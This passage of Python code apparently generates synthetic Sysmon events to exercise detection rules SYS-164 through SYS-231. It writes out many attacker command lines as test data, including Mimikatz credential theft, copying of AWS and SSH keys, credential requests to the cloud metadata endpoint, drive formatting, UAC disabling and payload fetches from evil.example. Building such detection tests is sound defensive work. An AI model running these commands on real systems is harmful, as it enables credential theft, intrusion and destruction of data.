    ev.append(proc(step(1), G["rubeus_ptt"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\Rubeus.exe",
                    r"Rubeus.exe ptt /ticket:C:\Users\redteam.ops\AppData\Local\Temp\ticket.kirbi",
                    pid=5670, ppid=4510, integrity="High"))

    # Mimikatz pass-the-hash -- deliberately also satisfies SYS-131's
    # generic Mimikatz module-signature catch-all (SYS-164).
    ev.append(proc(step(1), G["mimikatz_pth"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\mimikatz.exe",
                    r'mimikatz.exe "sekurlsa::pth /user:svc_backup /domain:corp.local '
                    r'/ntlm:aad3b435b51404eeaad3b435b51404ee"',
                    pid=5680, ppid=4510, integrity="High"))

    # SharpGPOAbuse pushing an immediate scheduled task through a GPO
    # (SYS-165).
    ev.append(proc(step(1), G["gpo_abuse"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\SharpGPOAbuse.exe",
                    r'SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" '
                    r'--Author "CORP\redteam.ops" --Command "cmd.exe" '
                    r'--Arguments "/c calc.exe" --GPOName "Default Domain Policy"',
                    pid=5690, ppid=4510, integrity="High"))

    # netdom disables SID-filtering protection on an existing domain trust
    # (SYS-166).
    ev.append(proc(step(1), G["trust_sidhistory"], G["ops"], r"C:\Windows\System32\netdom.exe",
                    "netdom.exe trust corp.local /domain:partner.local "
                    "/EnableSIDHistory:yes /quarantine:no", pid=5700, ppid=4510,
                    integrity="High"))

    # Silent unattended format /y against a drive letter -- destruction as
    # the goal itself, not a side effect of covering tracks (SYS-167).
    ev.append(proc(step(1), G["destructive_wipe"], G["ops"], r"C:\Windows\System32\format.com",
                    "format.com D: /y /q", pid=5710, ppid=4510, integrity="High"))

    # Bulk Get-ADUser -Filter piped into Disable-ADAccount -- mass account
    # lockout as a ransomware closing move (SYS-168).
    ev.append(proc(step(1), G["bulk_disable"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"Get-ADUser -Filter 'Enabled -eq $true' "
                    r"| Disable-ADAccount\"",
                    pid=5720, ppid=4510))

    # === Coverage-expansion pass 9: marginal ATT&CK gaps, off "ops" ===
    # A PowerShell process stages a copy of the AWS CLI's credentials file
    # (SYS-169).
    ev.append(proc(step(1), G["cloud_cred_staged"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -nop -c "Copy-Item $env:USERPROFILE\.aws\credentials '
                    r'C:\Users\redteam.ops\AppData\Local\Temp\credentials"',
                    pid=5730, ppid=4510))
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["cloud_cred_staged"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\.aws\credentials"))

    # curl reaching the cloud instance metadata address for IAM role
    # credentials (SYS-170).
    ev.append(proc(step(1), G["imds_theft"], G["ops"], r"C:\Windows\System32\curl.exe",
                    "curl.exe http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    pid=5740, ppid=4510))

    # A script interpreter stages a copy of the user's SSH private key
    # (SYS-171).
    ev.append(proc(step(1), G["ssh_key_staged"], G["ops"], r"C:\Windows\System32\cmd.exe",
                    r"cmd.exe /c copy %USERPROFILE%\.ssh\id_rsa "
                    r"C:\Users\redteam.ops\AppData\Local\Temp\id_rsa",
                    pid=5750, ppid=4510))
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\cmd.exe",
                         ProcessGuid=G["ssh_key_staged"],
                         TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Temp\id_rsa"))

    # wmic remote Win32_Process creation -- fileless lateral movement
    # (SYS-172).
    ev.append(proc(step(1), G["wmi_remote_exec"], G["ops"], r"C:\Windows\System32\wbem\WMIC.exe",
                    r'wmic.exe /node:10.10.10.20 /user:administrator process call create '
                    r'"cmd.exe /c whoami"',
                    pid=5760, ppid=4510))

    # mmc.exe spawns a shell -- MMC20.Application DCOM lateral movement
    # (SYS-173). Parented directly at root, not "ops": the whole point of
    # the technique is that mmc.exe itself is the entry point on the
    # target, not a child of an existing dispatcher.
    ev.append(proc(step(1), G["dcom_mmc"], G["root"], r"C:\Windows\System32\cmd.exe",
                    "cmd.exe /c whoami", pid=5770, ppid=3120,
                    parent_image=r"C:\Windows\System32\mmc.exe"))

    # docker run --privileged -- a container-escape precursor (SYS-174).
    ev.append(proc(step(1), G["docker_privileged"], G["ops"],
                    r"C:\Program Files\Docker\Docker\resources\bin\docker.exe",
                    "docker.exe run --rm --privileged alpine sh",
                    pid=5780, ppid=4510))

    # === Coverage-expansion pass 10: persistence, defense-evasion, credential-
    # access, and lateral-movement gaps, off "ops" (SYS-175..190) ===
    # A script interpreter overwrites the sticky-keys accessibility binary
    # (SYS-175).
    ev.append(proc(step(1), G["accessibility_replace"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -nop -c "Copy-Item payload.exe C:\Windows\System32\sethc.exe -Force"',
                    pid=5790, ppid=4510))
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["accessibility_replace"],
                         TargetFilename=r"C:\Windows\System32\sethc.exe"))

    # Winlogon helper DLL and Security Support Provider persistence, both
    # written directly by lsass.exe (SYS-176, SYS-177) -- reuses the same
    # lsass process node the SAM-manipulation event below uses, since a real
    # lsass.exe would be the one process making all of these writes.
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\lsass.exe", ProcessGuid=G["lsass"],
                         ParentProcessGuid=G["root"],
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
                         Details=r"explorer.exe, C:\Windows\Temp\helper.dll"))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\lsass.exe", ProcessGuid=G["lsass"],
                         ParentProcessGuid=G["root"],
                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages",
                         Details=r"C:\Windows\System32\evilssp.dll"))

    # Active Setup StubPath persistence (SYS-178).
    ev.append(proc(step(1), G["active_setup"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r'reg.exe add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{1CC1C-GUID}" '
                    r'/v StubPath /d "C:\Windows\Temp\a.exe"',
                    pid=5800, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["active_setup"],
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{1CC1C-GUID}\StubPath",
                         Details=r"C:\Windows\Temp\a.exe"))

    # A domain account created directly, not local (SYS-179).
    ev.append(proc(step(1), G["domain_account"], G["ops"], r"C:\Windows\System32\net.exe",
                    'net.exe user svc_backup "P@ssw0rd123!" /add /domain',
                    pid=5810, ppid=4510))

    # Boot configured into Safe Mode ahead of an encryptor run (SYS-180).
    ev.append(proc(step(1), G["safe_mode"], G["ops"], r"C:\Windows\System32\bcdedit.exe",
                    "bcdedit.exe /set {default} safeboot minimal",
                    pid=5820, ppid=4510))

    # Windows Event Log channel disabled (SYS-181).
    ev.append(proc(step(1), G["eventlog_disable"], G["ops"], r"C:\Windows\System32\wevtutil.exe",
                    "wevtutil.exe sl Security /e:false",
                    pid=5830, ppid=4510))

    # ISO mounted via PowerShell -- MOTW-bypass delivery (SYS-182).
    ev.append(proc(step(1), G["iso_mount"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -nop -c "Mount-DiskImage -ImagePath C:\Users\redteam.ops\Downloads\invoice.iso"',
                    pid=5840, ppid=4510))

    # Mimikatz dumping LSA secrets / cached domain credentials (SYS-183).
    ev.append(proc(step(1), G["mimikatz_lsasecrets"], G["ops"], r"C:\Users\redteam.ops\Downloads\mimikatz.exe",
                    r'mimikatz.exe "lsadump::secrets" exit',
                    pid=5850, ppid=4510))

    # Mimikatz forging a Kerberos golden ticket (SYS-184).
    ev.append(proc(step(1), G["mimikatz_golden"], G["ops"], r"C:\Users\redteam.ops\Downloads\mimikatz.exe",
                    r'mimikatz.exe "kerberos::golden /user:admin /domain:corp.local '
                    r'/sid:S-1-5-21 /krbtgt:aabbccdd /ptt" exit',
                    pid=5860, ppid=4510))

    # A double-extension file masking an executable (SYS-185).
    ev.append(proc(step(1), G["double_ext"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -nop -c "Move-Item a.tmp C:\Users\redteam.ops\Downloads\invoice.pdf.exe"',
                    pid=5870, ppid=4510))
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["double_ext"],
                         TargetFilename=r"C:\Users\redteam.ops\Downloads\invoice.pdf.exe"))

    # Registry queried for an autologon password (SYS-186).
    ev.append(proc(step(1), G["autologon_query"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r'reg.exe query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" '
                    r"/v DefaultPassword",
                    pid=5880, ppid=4510))

    # Group Policy Preferences cpassword harvested (SYS-187).
    ev.append(proc(step(1), G["gpp_cpassword"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "powershell -nop -c Get-GPPPassword.ps1",
                    pid=5890, ppid=4510))

    # SSH client used with a private key, lateral movement (SYS-188).
    ev.append(proc(step(1), G["ssh_lateral"], G["ops"], r"C:\Windows\System32\OpenSSH\ssh.exe",
                    r"ssh.exe -i C:\Users\redteam.ops\AppData\Local\Temp\id_rsa administrator@10.10.10.20",
                    pid=5900, ppid=4510))

    # Tor launched for anonymized C2 (SYS-189).
    ev.append(proc(step(1), G["tor_proxy"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\tor.exe", "tor.exe",
                    pid=5910, ppid=4510))

    # Fileless archive staged via .NET compression, no 7z/rar on disk (SYS-190).
    ev.append(proc(step(1), G["fileless_archive"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r'powershell -nop -c "[System.IO.Compression.ZipFile]::CreateFromDirectory('
                    r"'C:\Users\redteam.ops\Documents','C:\Users\redteam.ops\AppData\Local\Temp\d.zip')\"",
                    pid=5920, ppid=4510))

    # === Coverage-expansion pass 11: the last handful of Sysmon EventIDs with
    # zero rule coverage -- config tampering, WMI persistence's other two
    # events, a pipe connection with no local create, clipboard capture, and
    # a registry rename (SYS-191..196) ===
    # Sysmon's own logging configuration reloaded -- no process actor, this
    # is the driver itself re-reading its config (SYS-191).
    ev.append(raw_event(16, step(1), ConfigurationFileHash="SHA1=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1"))

    # The already-encoded PowerShell process also reads the clipboard --
    # reuses G["ps_enc"] rather than adding a new actor, since one process
    # doing both is exactly the realistic shape a clipboard-hijacking script
    # takes (SYS-195).
    ev.append(raw_event(24, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["ps_enc"]))

    # A persistence-relevant registry key renamed rather than set or deleted
    # (SYS-196).
    ev.append(proc(step(1), G["reg_rename"], G["ops"],
                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    r"powershell -nop -c \"Rename-Item 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'Run_bak'\"",
                    pid=5930, ppid=4510))
    ev.append(raw_event(14, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         ProcessGuid=G["reg_rename"], EventType="RenameKey",
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                         NewName=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run_bak"))

    # === Coverage-expansion pass 12: DLL side-loading, a rogue-CA install,
    # and a fake-installer double extension (SYS-197..199) ===
    # "ops" (cmd.exe, already under System32) loads an unsigned DLL staged
    # in Temp -- search-order hijacking / side-loading (SYS-197).
    ev.append(raw_event(7, step(1), Image=r"C:\Windows\System32\cmd.exe",
                         ProcessGuid=G["ops"],
                         ImageLoaded=r"C:\Windows\Temp\version.dll", Signed="false"))

    # certutil installs a certificate into the Root store -- a rogue CA
    # trusted system-wide (SYS-198).
    ev.append(proc(step(1), G["certutil_addstore"], G["ops"], r"C:\Windows\System32\certutil.exe",
                    r"certutil.exe -addstore Root C:\Users\redteam.ops\AppData\Local\Temp\evil.cer",
                    pid=5940, ppid=4510))

    # A renamed PE run from Downloads, disguised as an MSI installer
    # (SYS-199).
    ev.append(proc(step(1), G["fake_installer"], G["ops"],
                    r"C:\Users\redteam.ops\Downloads\setup.msi.exe",
                    r"setup.msi.exe /silent", pid=5950, ppid=4510))

    # === Coverage-expansion pass 13: UAC bypass, taken from real UACME and
    # CMSTP EVTX captures rather than synthesized (SYS-200..204) ===
    # eventvwr.exe launched directly by "ops" (not explorer.exe) and reaches
    # High integrity -- the auto-elevate mechanism invoked programmatically
    # (SYS-200), then loads an unsigned DLL staged alongside it (SYS-202).
    ev.append(proc(step(1), G["uac_eventvwr"], G["ops"], r"C:\Windows\System32\eventvwr.exe",
                    r'"C:\Windows\system32\eventvwr.exe" ', pid=5960, ppid=4510,
                    integrity="High"))
    ev.append(raw_event(7, step(1), Image=r"C:\Windows\System32\eventvwr.exe",
                         ProcessGuid=G["uac_eventvwr"],
                         ImageLoaded=r"C:\Windows\System32\dismcore.dll", Signed="false"))

    # The per-user %windir% environment value is hijacked to point at a
    # shell -- the SilentCleanup scheduled-task bypass (SYS-201). No process
    # actor by design, same as SYS-191 above: Sysmon attributes this write to
    # explorer.exe holding the user's registry hive, not a new dropper.
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\explorer.exe",
                         EventType="SetValue",
                         TargetObject=r"HKU\S-1-5-21-1-2-3-1000\Environment\windir",
                         Details=r'"C:\Windows\system32\cmd.exe"'))

    # UAC turned off system-wide via EnableLUA rather than bypassed for one
    # process (SYS-203).
    ev.append(proc(step(1), G["uac_disable_lua"], G["ops"], r"C:\Windows\System32\reg.exe",
                    r"reg add hklm\software\microsoft\windows\currentversion\policies\system "
                    r"/v EnableLUA /t REG_DWORD /d 0x0 /f",
                    pid=5970, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\system32\reg.exe",
                         ProcessGuid=G["uac_disable_lua"], EventType="SetValue",
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\EnableLUA",
                         Details="DWORD (0x00000000)"))

    # A COM elevation-moniker surrogate (DllHost.exe) spawns a shell at High
    # integrity -- the RottenPotato/EfsPotato/CMSTP-bypass shape (SYS-204).
    ev.append(proc(step(1), G["dllhost_com"], G["root"], r"C:\Windows\System32\DllHost.exe",
                    r"C:\Windows\system32\DllHost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
                    pid=5980, ppid=628, integrity="System"))
    ev.append(proc(step(1), G["dllhost_shell"], G["dllhost_com"], r"C:\Windows\System32\cmd.exe",
                    r"c:\windows\System32\cmd.exe", pid=5990, ppid=5980,
                    integrity="High"))

    # === Coverage-expansion pass 14: defense-evasion-misc and lateral-movement
    # gaps, field shapes taken from real EVTX-ATTACK-SAMPLES captures rather
    # than synthesized (SYS-205..220) ===
    # A downloaded loader suspends a freshly spawned notepad.exe by asking
    # for PROCESS_SUSPEND_RESUME rights only (SYS-205), then a second access
    # to the same target with a call trace that never resolves to ntdll.dll
    # -- an unbacked-memory/shellcode-originated call (SYS-206).
    ev.append(proc(step(1), G["hollow_src"], G["ops"], r"C:\Users\redteam.ops\Downloads\loader.exe",
                    "loader.exe", pid=6000, ppid=4510))
    ev.append(proc(step(1), G["hollow_target"], G["hollow_src"], r"C:\Windows\System32\notepad.exe",
                    "notepad.exe", pid=6010, ppid=6000))
    ev.append(raw_event(10, step(1), SourceImage=r"C:\Users\redteam.ops\Downloads\loader.exe",
                         SourceProcessGUID=G["hollow_src"], TargetImage=r"C:\Windows\System32\notepad.exe",
                         TargetProcessGUID=G["hollow_target"], GrantedAccess="0x800", User=USER))
    ev.append(raw_event(10, step(1), SourceImage=r"C:\Users\redteam.ops\Downloads\loader.exe",
                         SourceProcessGUID=G["hollow_src"], TargetImage=r"C:\Windows\System32\notepad.exe",
                         TargetProcessGUID=G["hollow_target"], GrantedAccess="0x1fffff",
                         CallTrace="UNKNOWN(000001F3C35A0014)", User=USER))

    # WerFault reports a crash in the process hosting the Event Log service
    # (SYS-207).
    ev.append(proc(step(1), G["werfault_crash"], G["root"], r"C:\Windows\System32\WerFault.exe",
                    r"C:\Windows\system32\WerFault.exe -u -p 1234 -s 5678", pid=6020, ppid=628,
                    parent_image=r"C:\Windows\System32\svchost.exe",
                    parent_cmdline=r"C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog"))

    # PsExec's relay pipes survive a rename of the service binary itself --
    # the pipe naming convention is the signature, not the filename (SYS-208).
    ev.append(raw_event(17, step(1), Image=r"C:\Windows\PSEXESVC.exe",
                         ProcessGuid=G["psexec"], PipeName=fr"\svchost-{HOST}-8116-stdout"))

    # attrib +h hides a tool dropped next to legitimate files (SYS-209).
    ev.append(proc(step(1), G["attrib_hide"], G["ops"], r"C:\Windows\System32\attrib.exe",
                    "attrib.exe +h nbtscan.exe", pid=6030, ppid=4510))

    # PowerShell's execution policy forced to Unrestricted straight through
    # the registry, bypassing Set-ExecutionPolicy (SYS-210).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         EventType="SetValue",
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\ExecutionPolicy",
                         Details="Unrestricted"))

    # Office's AccessVBOM flipped on via registry so a macro can generate
    # more VBA at runtime (SYS-211).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\wbem\wmiprvse.exe",
                         EventType="SetValue",
                         TargetObject=r"HKU\S-1-5-21-1-2-3-1000\Software\Microsoft\Office\16.0\Excel\Security\AccessVBOM",
                         Details="DWORD (0x00000001)"))

    # A file dropped in Downloads carries PE metadata claiming to be
    # IEXPLORE.EXE -- the ImageLoad-time counterpart of SYS-092, needed
    # because Process Herpaderping-style content swaps leave the spoofed
    # metadata on the module load rather than the process-creation event
    # (SYS-212).
    ev.append(proc(step(1), G["downloads_herpaderp"], G["ops"], r"C:\Users\redteam.ops\Downloads\report.exe",
                    "report.exe", pid=6040, ppid=4510))
    ev.append(raw_event(7, step(1), Image=r"C:\Users\redteam.ops\Downloads\report.exe",
                         ProcessGuid=G["downloads_herpaderp"],
                         ImageLoaded=r"C:\Users\redteam.ops\Downloads\report.exe",
                         OriginalFileName="IEXPLORE.EXE", Signed="false"))

    # SharpRDP executed directly, parented at root as an RDP-session arrival
    # rather than a child of the phishing chain (SYS-213).
    ev.append(proc(step(1), G["sharprdp_tool"], G["root"], r"C:\ProgramData\USOShared\SharpRDP.exe",
                    r'SharpRDP.exe computername=192.168.56.1 command="C:\Temp\file.exe"',
                    pid=6050, ppid=628))

    # A WMI-spawned command redirects its output to the ADMIN$ hidden
    # share -- the wmiexec.py/smbexec.py fake-interactive-shell mechanism
    # (SYS-214).
    ev.append(proc(step(1), G["wmi_hidden_share"], G["wmiprvse"], r"C:\Windows\System32\cmd.exe",
                    r"cmd.exe /Q /c whoami /all 1> \\127.0.0.1\ADMIN$\__1556656369.7 2>&1",
                    pid=6060, ppid=5900, parent_image=r"C:\Windows\System32\wbem\wmiprvse.exe"))

    # lsass.exe loads a DLL straight off a remote SMB share (SYS-215).
    ev.append(raw_event(7, step(1), Image=r"C:\Windows\System32\lsass.exe", ProcessGuid=G["lsass"],
                         ImageLoaded=r"\\172.16.66.254\shared\lsadb.dll", Signed="false"))

    # NTDS's DirectoryServiceExtPt is pointed at the same remote share --
    # the "AdamXpn" DC-DLL-load trick (SYS-216).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\svchost.exe", EventType="SetValue",
                         TargetObject=r"HKLM\System\CurrentControlSet\Services\NTDS\DirectoryServiceExtPt",
                         Details=r"\\172.16.66.254\shared\lsadb.dll"))

    # A new SMB share staged directly through the registry, bypassing `net
    # share` (SYS-217).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\svchost.exe", EventType="SetValue",
                         TargetObject=r"HKLM\System\CurrentControlSet\Services\LanmanServer\Shares\staging",
                         Details="Binary Data"))

    # NullSessionPipes reopened for anonymous access (SYS-218).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", EventType="SetValue",
                         TargetObject=r"HKLM\System\CurrentControlSet\services\LanmanServer\Parameters\NullSessionPipes",
                         Details="Binary Data"))

    # A named pipe whose name is a bare hex-hash string -- framework-
    # generated backdoor pipe naming, create and connect (SYS-219, SYS-220).
    ev.append(raw_event(17, step(1), Image=r"C:\Windows\System32\cmd.exe", ProcessGuid=G["ops"],
                         PipeName=r"\46a676ab7f179e511e30dd2dc41bd388"))
    ev.append(raw_event(18, step(1), Image=r"C:\Windows\System32\cmd.exe", ProcessGuid=G["ops"],
                         PipeName=r"\46a676ab7f179e511e30dd2dc41bd388"))

    # === FTP LOLBAS execution, off "ops" ===
    ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
                    r"ftp.exe -s:C:\Users\redteam.ops\AppData\Local\Temp\ftp.txt",
                    pid=4980, ppid=4510))
    ev.append(proc(step(1), G["ftp_cmd"], G["ftp"], r"C:\Windows\System32\cmd.exe",
                    r"C:\Windows\system32\cmd.exe /C calc.exe", pid=4990, ppid=4980))

    # === Arrivals framed as coming from the network, parented at root ===
    # Remote WMI/DCOM persistence.
    ev.append(raw_event(13, step(2), Image=r"C:\Windows\System32\wbem\wmiprvse.exe",
                         ProcessGuid=G["wmiprvse"], ParentProcessGuid=G["root"],
                         TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\wmipers",
                         Details=r"rundll32.exe C:\Windows\Temp\a.dll, DllMain"))

    # PsExec lateral-movement arrival.
    ev.append(proc(step(1), G["psexec"], G["root"], r"C:\Windows\PSEXESVC.exe",
                    "PSEXESVC.exe -accepteula", pid=5000, ppid=628))
    ev.append(raw_event(17, step(1), Image=r"C:\Windows\PSEXESVC.exe",
                         ProcessGuid=G["psexec"], PipeName=r"\PSEXESVC"))
    ev.append(raw_event(18, step(0), Image=r"C:\Windows\PSEXESVC.exe",
                         ProcessGuid=G["psexec"], PipeName=r"\PSEXESVC"))

    # IIS worker process compromised via a web request; spawns a shell and
    # dumps app-pool credentials with appcmd.
    ev.append(proc(step(1), G["w3wp"], G["root"], r"C:\Windows\System32\inetsrv\w3wp.exe",
                    r'c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool"',
                    pid=5010, ppid=612, user="IIS APPPOOL\\DefaultAppPool"))
    ev.append(proc(step(1), G["w3wp_cmd"], G["w3wp"], r"C:\Windows\System32\cmd.exe",
                    '"cmd.exe" /c whoami', pid=5020, ppid=5010, user="IIS APPPOOL\\DefaultAppPool"))
    ev.append(proc(step(1), G["appcmd"], G["w3wp"], r"C:\Windows\System32\inetsrv\appcmd.exe",
                    "appcmd.exe list apppool /text:processmodel.password", pid=5030, ppid=5010,
                    user="IIS APPPOOL\\DefaultAppPool"))

    # SQL Server compromised, xp_cmdshell spawns a shell.
    ev.append(proc(step(1), G["sqlservr"], G["root"],
                    r"C:\Program Files\Microsoft SQL Server\MSSQL10.SQLEXPRESS\MSSQL\Binn\sqlservr.exe",
                    r'"sqlservr.exe" -sSQLEXPRESS', pid=5040, ppid=616, user="NT SERVICE\\MSSQL$SQLEXPRESS"))
    ev.append(proc(step(1), G["sql_cmd"], G["sqlservr"], r"C:\Windows\System32\cmd.exe",
                    r'"cmd.exe" /c whoami', pid=5050, ppid=5040, user="NT SERVICE\\MSSQL$SQLEXPRESS"))

    # PowerShell remoting session executing a command.
    ev.append(proc(step(1), G["wsmprovhost"], G["root"], r"C:\Windows\System32\wsmprovhost.exe",
                    "C:\\Windows\\system32\\wsmprovhost.exe -Embedding", pid=5060, ppid=620))
    ev.append(proc(step(1), G["hostname"], G["wsmprovhost"], r"C:\Windows\System32\HOSTNAME.EXE",
                    '"HOSTNAME.EXE"', pid=5070, ppid=5060))

    # Direct SAM manipulation.
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\lsass.exe", ProcessGuid=G["lsass"],
                         ParentProcessGuid=G["root"],
                         TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\svc_backup\(Default)",
                         Details="Binary Data"))

    # === Coverage-expansion pass 15: Execution, Persistence, and Credential
    # Access gaps, field shapes taken from real EVTX-ATTACK-SAMPLES captures
    # rather than synthesized (SYS-221..239) ===
    # msiexec runs a custom action that lands a temp binary straight in the
    # Installer cache (SYS-221).
    ev.append(proc(step(1), G["msiexec_installer"], G["root"], r"C:\Windows\System32\msiexec.exe",
                    "C:\\Windows\\system32\\msiexec.exe /V", pid=6100, ppid=628))
    ev.append(proc(step(1), G["msi_temp_bin"], G["msiexec_installer"], r"C:\Windows\Installer\MSI4FFD.tmp",
                    '"C:\\Windows\\Installer\\MSI4FFD.tmp"', pid=6110, ppid=6100))

    # hh.exe opens a .chm that embeds a shortcut object, immediately spawning
    # a shell (SYS-222).
    ev.append(proc(step(1), G["hh_help"], G["ops"], r"C:\Windows\hh.exe",
                    r'"C:\Windows\hh.exe" C:\Users\redteam.ops\Desktop\Invoice.chm', pid=6120, ppid=4510))
    ev.append(proc(step(1), G["hh_shell"], G["hh_help"], r"C:\Windows\System32\cmd.exe",
                    r'"C:\Windows\System32\cmd.exe" /c calc.exe', pid=6130, ppid=6120))

    # msxsl.exe run at all -- not a Windows component, so its presence alone
    # is the signal (SYS-223).
    ev.append(proc(step(1), G["msxsl_tool"], G["ops"], r"C:\Users\redteam.ops\Downloads\msxsl.exe",
                    r"msxsl.exe payload.dat payload.dat", pid=6140, ppid=4510))

    # WMIC formats its output through a remotely-hosted XSL stylesheet --
    # Squiblytwo (SYS-224).
    ev.append(proc(step(1), G["wmic_squibly"], G["ops"], r"C:\Windows\System32\wbem\WMIC.exe",
                    r'wmic process list /format:"https://evil.example/style.xsl"', pid=6150, ppid=4510))

    # MSBuild's pre-build event proxies straight to a shell -- Trusted
    # Developer Utilities Proxy Execution (SYS-225).
    ev.append(proc(step(1), G["msbuild_proxy"], G["ops"],
                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                    "MSBuild.exe /nologo /nodemode:1 /nodeReuse:true", pid=6160, ppid=4510))
    ev.append(proc(step(1), G["msbuild_shell"], G["msbuild_proxy"], r"C:\Windows\System32\cmd.exe",
                    r'"C:\Windows\System32\cmd.exe" /Q /D /C build_event.cmd', pid=6170, ppid=6160))

    # svchost's DcomLaunch service group -- DCOM Server Process Launcher and
    # Plug and Play, neither of which forks a shell -- spawns cmd.exe (SYS-226).
    ev.append(proc(step(1), G["svchost_dcomlaunch"], G["root"], r"C:\Windows\System32\svchost.exe",
                    "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p -s PlugPlay",
                    pid=6180, ppid=628, user="NT AUTHORITY\\SYSTEM"))
    ev.append(proc(step(1), G["dcomlaunch_shell"], G["svchost_dcomlaunch"], r"C:\Windows\System32\cmd.exe",
                    r'"C:\Windows\System32\cmd.exe"', pid=6190, ppid=6180, user="NT AUTHORITY\\SYSTEM",
                    parent_cmdline="C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p -s PlugPlay"))

    # explorer.exe launched through the undocumented /root, switch, which no
    # user double-click ever produces (SYS-227).
    ev.append(proc(step(1), G["explorer_root"], G["ops"], r"C:\Windows\explorer.exe",
                    r'explorer.exe /root,"C:\Windows\System32\calc.exe"', pid=6200, ppid=4510))

    # desktopimgdownldr.exe fetches an arbitrary remote file through its
    # /lockscreenurl: switch (SYS-228).
    ev.append(proc(step(1), G["desktopimgdownldr_dl"], G["ops"], r"C:\Windows\System32\desktopimgdownldr.exe",
                    r"desktopimgdownldr.exe /lockscreenurl:https://evil.example/payload.7z "
                    r"/eventName:desktopimgdownldr", pid=6210, ppid=4510))

    # A CLSID's TreatAs value is redirected to another CLSID that already has
    # a hijacked InprocServer32 -- the second, less-watched COM-hijack lever
    # alongside SYS-122 (SYS-229).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", EventType="SetValue",
                         TargetObject=(r"HKU\S-1-5-21-1-2-3-1000_CLASSES\CLSID"
                                       r"\{84DA0A92-25E0-11D3-B9F7-00C04F4C8F5D}\TreatAs\{Default}"),
                         Details="{42aedc87-2188-41fd-b9a3-0c966feabec1}"))

    # A raw write straight to the built-in Administrator's RID (500) in the
    # SAM hive, bypassing lsass's normal account-management APIs (SYS-230).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\lsass.exe", ProcessGuid=G["lsass"],
                         ParentProcessGuid=G["root"], EventType="SetValue",
                         TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F4\ForcePasswordReset",
                         Details="Binary Data"))

    # osk.exe, reachable from the logon screen before any credential is
    # entered, spawns a process -- something the on-screen keyboard never
    # legitimately does (SYS-231).
    ev.append(proc(step(1), G["osk_tool"], G["root"], r"C:\Windows\System32\osk.exe",
                    '"C:\\Windows\\System32\\osk.exe"', pid=6220, ppid=1112, user="NT AUTHORITY\\SYSTEM",
